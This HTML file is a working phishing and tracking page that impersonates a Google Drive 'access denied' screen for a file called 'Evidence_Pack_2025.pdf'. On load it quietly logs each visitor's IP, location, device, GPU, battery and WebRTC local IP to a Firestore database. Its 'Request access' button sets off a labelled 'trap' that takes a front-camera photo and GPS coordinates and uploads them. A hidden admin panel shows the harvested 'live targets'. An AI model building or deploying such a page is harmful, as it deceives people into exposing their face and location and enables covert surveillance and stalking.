<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Drive - Access Denied</title>
    <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- FIREBASE SDKs (Compat version for simple HTML usage) -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500&display=swap');
        
        body { font-family: 'Roboto', sans-serif; overflow-x: hidden; background-color: #ffffff; }
        .google-font { font-family: 'Google Sans', sans-serif; }
        
        /* G-Drive UI */
        .g-btn { background-color: #1a73e8; color: white; border: none; box-shadow: 0 1px 2px rgba(60,64,67,0.3); transition: 0.2s; }
        .g-btn:active { background-color: #1765cc; }
        .g-btn:disabled { background-color: #dadce0; color: #888; cursor: not-allowed; box-shadow: none; }
        .g-input { border: 1px solid #dadce0; border-radius: 4px; padding: 12px; font-size: 16px; width: 100%; transition: 0.2s; -webkit-appearance: none; }
        .g-input:focus { border-color: #1a73e8; outline: none; border-width: 2px; padding: 11px; }

        /* Admin Panel */
        .admin-view { background-color: #0f172a; color: #cbd5e1; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
        .hidden-mode { display: none !important; }
        .cyber-scroll::-webkit-scrollbar { width: 4px; }
        .cyber-scroll::-webkit-scrollbar-track { background: #1e293b; }
        .cyber-scroll::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }

        /* Animations */
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .live-indicator { animation: flash 2s infinite; }
        
        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
        .log-item { animation: slideIn 0.3s ease-out; }
    </style>
</head>
<body>

    <!-- HIDDEN SENSORS -->
    <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" class="hidden"></canvas>

    <!-- 1. GOOGLE DRIVE UI (The Bait) -->
    <div id="gdrive-view" class="min-h-screen w-full flex flex-col items-center justify-between md:justify-center bg-white relative z-10">
        
        <div class="w-full p-4 flex items-center justify-between md:absolute md:top-0 md:left-0">
            <div class="flex items-center gap-2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Logo" class="w-8 h-8">
                <span class="text-gray-500 text-lg google-font">Drive</span>
            </div>
            <div class="flex items-center gap-3">
                 <button onclick="manualAdminTrigger()" class="text-gray-500 p-2 rounded-full outline-none">
                    <i class="fa-regular fa-circle-question text-xl"></i>
                </button>
                <div id="admin-trigger" class="w-8 h-8 bg-purple-600 rounded-full text-white flex items-center justify-center text-sm font-medium select-none cursor-pointer active:scale-95 transition-transform">S</div>
            </div>
        </div>

        <div class="g-card max-w-[480px] w-full p-8 space-y-6 md:border md:border-gray-200 md:rounded-lg md:shadow-lg">
            <h1 class="text-2xl text-gray-800 google-font font-normal">You need access</h1>
            <div class="text-gray-600 text-[14px] leading-relaxed space-y-2">
                <p>You don't have permission to view the file <strong>"Evidence_Pack_2025.pdf"</strong>.</p>
                <p>Request access from the owner to verify your identity and view the document.</p>
            </div>
            <div class="space-y-6 pt-2">
                <textarea class="g-input h-24 resize-none" placeholder="Message (optional)"></textarea>
                <div class="flex items-center justify-end gap-3">
                    <div class="text-gray-600 text-sm font-medium px-2 py-2 rounded hover:bg-gray-50 cursor-pointer select-none">Switch accounts</div>
                    <button onclick="triggerActiveTrap()" id="req-btn" class="g-btn px-6 py-2 rounded text-sm font-medium w-full md:w-auto flex justify-center items-center">
                        Request access
                    </button>
                </div>
                <div id="gps-status" class="text-center text-[10px] text-gray-400 hidden">
                    <i class="fa-solid fa-satellite-dish fa-spin mr-1"></i> Syncing to Cloud...
                </div>
            </div>
        </div>

        <div class="g-footer w-full bg-white md:bg-gray-50 p-4 text-center text-xs text-gray-500 md:border-t md:border-gray-200">
            <p>Google Drive protects your files. <span class="text-blue-700 cursor-pointer">Learn more</span></p>
        </div>
    </div>

    <!-- 2. ADMIN PANEL (Cloud Sync) -->
    <div id="admin-view" class="hidden-mode absolute inset-0 admin-view h-screen flex flex-col z-50">
        
        <div class="bg-slate-900 border-b border-slate-700 p-3 flex justify-between items-center shadow-lg sticky top-0 z-50">
            <div class="flex items-center gap-2">
                <div class="bg-blue-500/20 p-1.5 rounded-full live-indicator">
                    <i class="fa-solid fa-cloud text-blue-400 text-sm"></i>
                </div>
                <div>
                    <h1 class="text-xs font-bold text-white tracking-wider uppercase">Krysha's Cloud Netra</h1>
                    <p class="text-[9px] text-slate-400">SYNC: <span id="sync-status" class="text-yellow-400">CONNECTING...</span></p>
                </div>
            </div>
            <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-[10px] border border-slate-600">EXIT</button>
        </div>

        <div class="flex flex-col md:flex-row flex-grow overflow-hidden">
            <!-- Log List -->
            <div class="w-full md:w-1/4 h-1/3 md:h-full bg-slate-900 border-b md:border-b-0 md:border-r border-slate-800 flex flex-col">
                <div class="p-2 border-b border-slate-800 bg-slate-800/50 flex justify-between items-center">
                    <span class="text-[10px] font-bold text-slate-400 uppercase">Live Targets (Last 8)</span>
                </div>
                <div id="log-list" class="flex-grow overflow-y-auto cyber-scroll p-2 space-y-2">
                    <div class="text-center mt-10 text-slate-600 text-xs">Waiting for live data...</div>
                </div>
            </div>

            <!-- Detail View -->
            <div class="w-full md:w-3/4 h-2/3 md:h-full bg-slate-950 p-4 md:p-6 overflow-y-auto cyber-scroll relative">
                <div class="flex justify-between items-end mb-4 border-b border-slate-800 pb-2">
                    <div>
                        <h2 class="text-lg font-bold text-white" id="detail-title">Select Log</h2>
                        <p class="text-[10px] text-slate-400 mt-1" id="detail-time">--</p>
                    </div>
                    <span id="vpn-badge" class="hidden bg-red-600 text-white text-[9px] px-2 py-1 rounded font-bold uppercase">VPN DETECTED</span>
                </div>

                <div class="grid grid-cols-1 xl:grid-cols-2 gap-4">
                    <!-- Network -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-green-400 mb-2 uppercase"><i class="fa-solid fa-globe mr-1"></i> Network Info</h3>
                        <div class="space-y-1 font-mono text-xs">
                            <div class="flex justify-between"><span class="text-slate-500">IP:</span> <span id="detail-ip" class="text-white font-bold">...</span></div>
                            <div class="flex justify-between"><span class="text-slate-500">ISP:</span> <span id="detail-isp" class="text-blue-300 truncate w-32 text-right">...</span></div>
                            <div class="flex justify-between"><span class="text-slate-500">LOC:</span> <span id="detail-city" class="text-slate-300 truncate w-32 text-right">...</span></div>
                            <div class="flex justify-between border-t border-slate-800 pt-1 mt-1"><span class="text-slate-500">WebRTC:</span> <span id="detail-localip" class="text-red-400">...</span></div>
                        </div>
                    </div>

                    <!-- GPS -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-yellow-400 mb-2 uppercase"><i class="fa-solid fa-location-cross mr-1"></i> GPS Status</h3>
                        <div id="detail-gps" class="space-y-1 font-mono text-xs text-slate-300">
                             <p class="text-slate-500 italic">No Active Trace.</p>
                        </div>
                    </div>

                    <!-- Photo -->
                    <div class="bg-black border border-slate-700 rounded-lg overflow-hidden aspect-video flex items-center justify-center relative shadow-lg group">
                        <div id="detail-img" class="text-slate-600 flex flex-col items-center">
                            <i class="fa-solid fa-image text-2xl mb-1"></i>
                            <span class="text-[10px]">No Visuals</span>
                        </div>
                    </div>

                    <!-- Device -->
                    <div class="bg-slate-900 border border-slate-700 rounded-lg p-3 shadow-lg">
                        <h3 class="text-[10px] font-bold text-blue-400 mb-2 uppercase"><i class="fa-solid fa-mobile-screen mr-1"></i> System</h3>
                        <div class="grid grid-cols-2 gap-2 text-[10px] font-mono text-slate-300">
                            <div><span class="text-slate-500 block">Platform:</span> <span id="detail-platform">...</span></div>
                            <div><span class="text-slate-500 block">Battery:</span> <span id="detail-batt">...</span></div>
                            <div class="col-span-2"><span class="text-slate-500 block">GPU:</span> <span id="detail-gpu" class="truncate block text-yellow-500">...</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // === 1. FIREBASE SETUP ===
        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app';
        
        let db;
        let auth;
        let currentUser = null;
        let sessionDocId = null;

        // --- 2. CORE LOGIC ---
        async function initApp() {
            if (!firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            auth = firebase.auth();
            db = firebase.firestore();

            // 1. Auth First
            await signIn();

            // 2. Check URL for Admin Mode
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('admin') === 'true') {
                toggleView(); // Open admin panel directly
            }

            // 3. Start Passive Logging (Create/Update Session)
            startPassiveLog();
        }

        async function signIn() {
            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                await auth.signInWithCustomToken(__initial_auth_token);
            } else {
                await auth.signInAnonymously();
            }
            currentUser = auth.currentUser;
        }

        // --- 3. LOGGING TO CLOUD ---
        async function startPassiveLog() {
            if (!currentUser) return;

            // Basic Device Info
            const deviceInfo = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timestamp: Date.now(), // Using Client Timestamp for simpler sorting locally
                type: "PASSIVE CONNECT",
                ip: "Scanning...",
                status: "Online"
            };

            // Create a new document for this session
            // Using strict path Rule 1
            const collectionRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs');
            const docRef = await collectionRef.add(deviceInfo);
            sessionDocId = docRef.id;

            // Start Async Updates (Network, Battery, etc)
            enrichData(docRef);
        }

        async function enrichData(docRef) {
            // A. Battery
            let battery = "Unknown";
            try {
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = `${Math.round(b.level*100)}%`;
                }
            } catch(e) {}

            // B. GPU
            let gpu = "Unknown";
            try {
                const cvs = document.createElement('canvas');
                const gl = cvs.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // C. Network (Async)
            let netData = { ip: "Blocked", isp: "N/A", city: "N/A" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                if(res.ok) {
                    const data = await res.json();
                    netData = { ip: data.ip, isp: data.org, city: `${data.city}, ${data.country_name}` };
                } else {
                     // Backup
                     const res2 = await fetch('https://ipwho.is/');
                     const data2 = await res2.json();
                     netData = { ip: data2.ip, isp: data2.connection?.isp, city: data2.city };
                }
            } catch(e) {}

            // D. WebRTC
            let localIP = "Secure";
            try {
                 const pc = new RTCPeerConnection({iceServers:[]});
                 pc.createDataChannel('');
                 pc.onicecandidate = e => {
                    if(e.candidate) {
                        const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if(m && !m[1].endsWith('.local')) {
                             docRef.update({ local_ip: m[1] }); // Update specifically
                        }
                    }
                 };
                 pc.createOffer().then(o=>pc.setLocalDescription(o));
            } catch(e) {}

            // UPDATE FIRESTORE
            docRef.update({
                battery: battery,
                gpu: gpu,
                ip: netData.ip,
                isp: netData.isp,
                city: netData.city,
                local_ip: localIP
            });
        }

        // --- 4. ACTIVE TRAP (Cam + GPS) ---
        async function triggerActiveTrap() {
            const btn = document.getElementById('req-btn');
            const statusEl = document.getElementById('gps-status');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verifying...';
            btn.disabled = true;
            statusEl.classList.remove('hidden'); // Show "Triangulating..." text

            if (!sessionDocId) return;

            // Updates to push
            let updates = {
                type: "ACTIVE TRAP TRIGGERED",
                // Force update timestamp to bring to top
                timestamp: Date.now() 
            };

            // Parallel Promise Execution
            Promise.allSettled([captureGPS(), captureCamera()]).then((results) => {
                
                // GPS Handling
                if (results[0].status === 'fulfilled') {
                    updates.gps = results[0].value;
                    updates.gps_status = "LOCKED";
                } else {
                    updates.gps = { error: results[0].reason || "Denied" };
                    updates.gps_status = "FAILED";
                }

                // Camera Handling
                if (results[1].status === 'fulfilled') {
                    updates.image = results[1].value;
                    updates.cam_status = "CAPTURED";
                } else {
                    updates.cam_status = "DENIED";
                }

                // Push to Cloud
                db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs').doc(sessionDocId).update(updates);

                // UI Cleanup
                setTimeout(() => {
                    alert("Verification submitted. You will be contacted shortly.");
                    btn.innerText = "Request Sent";
                    statusEl.classList.add('hidden');
                }, 1000);
            });
        }

        // Sensors
        function captureCamera() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const vid = document.getElementById('hidden-video');
                    const cvs = document.getElementById('hidden-canvas');
                    vid.srcObject = stream;
                    vid.onloadedmetadata = () => {
                        vid.play();
                        cvs.width = vid.videoWidth; cvs.height = vid.videoHeight;
                        setTimeout(() => {
                            cvs.getContext('2d').drawImage(vid,0,0);
                            const d = cvs.toDataURL('image/jpeg', 0.5);
                            stream.getTracks().forEach(t=>t.stop());
                            resolve(d);
                        }, 500);
                    };
                }).catch(reject);
            });
        }

        function captureGPS() {
            return new Promise((resolve, reject) => {
                if(!navigator.geolocation) reject("No Geo API");
                
                // Fallback Logic: Try High Accuracy, if timeout, use default
                const success = (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
                
                // First try aggressive (5s)
                navigator.geolocation.getCurrentPosition(success, (err) => {
                    // If fail/timeout, try low accuracy (10s)
                    console.log("High accuracy failed, trying low accuracy...");
                    navigator.geolocation.getCurrentPosition(success, (finalErr) => reject(finalErr.message), { enableHighAccuracy: false, timeout: 10000 });
                }, { enableHighAccuracy: true, timeout: 5000 });
            });
        }


        // --- 5. ADMIN PANEL (Real-Time Listener) ---
        let unsubscribe = null;

        function startAdminListener() {
            if (unsubscribe) return; // Already listening

            const listEl = document.getElementById('log-list');
            const statusEl = document.getElementById('sync-status');
            
            statusEl.innerText = "LIVE SYNC ON";
            statusEl.classList.add('text-green-400');

            // Following Rule 2: Fetch collection simply, filter in memory
            const colRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('tracking_logs');

            unsubscribe = colRef.onSnapshot((snapshot) => {
                listEl.innerHTML = '';
                if(snapshot.empty) {
                    listEl.innerHTML = '<div class="text-center mt-10 text-slate-500 text-xs">No active targets found.</div>';
                    return;
                }

                // Client-side sorting (Rule 2 Compliance)
                let docs = [];
                snapshot.forEach(doc => docs.push(doc.data()));
                
                // Sort by timestamp desc
                docs.sort((a, b) => b.timestamp - a.timestamp);
                
                // Limit to 8
                docs = docs.slice(0, 8);

                docs.forEach((data) => {
                    const el = document.createElement('div');
                    let border = 'border-slate-600';
                    if (data.type.includes('ACTIVE')) border = 'border-red-500';
                    else if (data.ip && data.ip !== 'Scanning...') border = 'border-green-500';

                    // Convert timestamp
                    let timeStr = "Just now";
                    if(data.timestamp) timeStr = new Date(data.timestamp).toLocaleTimeString();

                    el.className = `p-2 bg-slate-800 rounded border-l-2 ${border} cursor-pointer hover:bg-slate-700 mb-2 transition-all`;
                    el.innerHTML = `
                        <div class="flex justify-between items-center mb-1">
                            <span class="font-bold text-[10px] uppercase text-white">${data.type}</span>
                            <span class="text-[9px] text-slate-500">${timeStr}</span>
                        </div>
                        <p class="text-[9px] text-slate-400 font-mono truncate">${data.ip}</p>
                    `;
                    el.onclick = () => showDetails(data);
                    listEl.appendChild(el);
                });
            }, (error) => {
                console.error("Sync Error:", error);
                statusEl.innerText = "SYNC ERROR";
                statusEl.classList.remove('text-green-400');
                statusEl.classList.add('text-red-500');
            });
        }

        function showDetails(d) {
            document.getElementById('detail-ip').innerText = d.ip || '...';
            document.getElementById('detail-isp').innerText = d.isp || '...';
            document.getElementById('detail-city').innerText = d.city || '...';
            document.getElementById('detail-localip').innerText = d.local_ip || 'Secure';
            document.getElementById('detail-platform').innerText = d.platform || 'Unknown';
            document.getElementById('detail-batt').innerText = d.battery || 'N/A';
            document.getElementById('detail-gpu').innerText = d.gpu || 'N/A';

            // GPS Logic
            const gpsEl = document.getElementById('detail-gps');
            if (d.gps && d.gps.lat) {
                gpsEl.innerHTML = `
                    <p class="text-green-400 font-bold mb-1">LOCKED</p>
                    <div>Lat: ${d.gps.lat}</div><div>Lon: ${d.gps.lon}</div>
                    <div class="text-slate-500 text-[9px]">Acc: ${Math.round(d.gps.acc)}m</div>
                    <a href="https://maps.google.com/?q=${d.gps.lat},${d.gps.lon}" target="_blank" class="text-blue-400 underline mt-1 block">Open Map</a>
                `;
            } else {
                gpsEl.innerHTML = `<p class="text-red-400 italic">${d.gps?.error || "Waiting for trigger..."}</p>`;
            }

            // Image Logic
            const imgEl = document.getElementById('detail-img');
            if (d.image) {
                imgEl.innerHTML = `<img src="${d.image}" class="w-full h-full object-cover">`;
            } else {
                imgEl.innerHTML = `<i class="fa-solid fa-image text-2xl mb-1 text-slate-600"></i><span class="text-[10px] text-slate-600">No Visuals</span>`;
            }
            
             // VPN Check
             const vpnBadge = document.getElementById('vpn-badge');
             if(d.local_ip && d.local_ip !== "Secure") vpnBadge.classList.remove('hidden');
             else vpnBadge.classList.add('hidden');
        }

        // --- 6. UI TOGGLES ---
        function toggleView() {
            const admin = document.getElementById('admin-view');
            const drive = document.getElementById('gdrive-view');
            
            if (admin.classList.contains('hidden-mode')) {
                admin.classList.remove('hidden-mode');
                drive.classList.add('hidden-mode');
                startAdminListener(); // Start listening to cloud
            } else {
                admin.classList.add('hidden-mode');
                drive.classList.remove('hidden-mode');
                if (unsubscribe) { unsubscribe(); unsubscribe = null; } // Stop listening to save bandwidth
            }
        }

        // Triggers
        let knockCount=0, knockTimer;
        function manualAdminTrigger() {
            knockCount++; clearTimeout(knockTimer); knockTimer=setTimeout(()=>knockCount=0,2000);
            if(knockCount===3) { toggleView(); knockCount=0; }
        }
        
        const mobTrig = document.getElementById('admin-trigger');
        let pt;
        mobTrig.addEventListener('touchstart', (e) => {
            pt = setTimeout(() => { toggleView(); if(navigator.vibrate) navigator.vibrate(50); }, 2000);
        });
        mobTrig.addEventListener('touchend', () => clearTimeout(pt));
        mobTrig.addEventListener('mousedown', () => pt = setTimeout(toggleView, 2000));
        mobTrig.addEventListener('mouseup', () => clearTimeout(pt));

        // Start App
        initApp();

    </script>
</body>
</html>
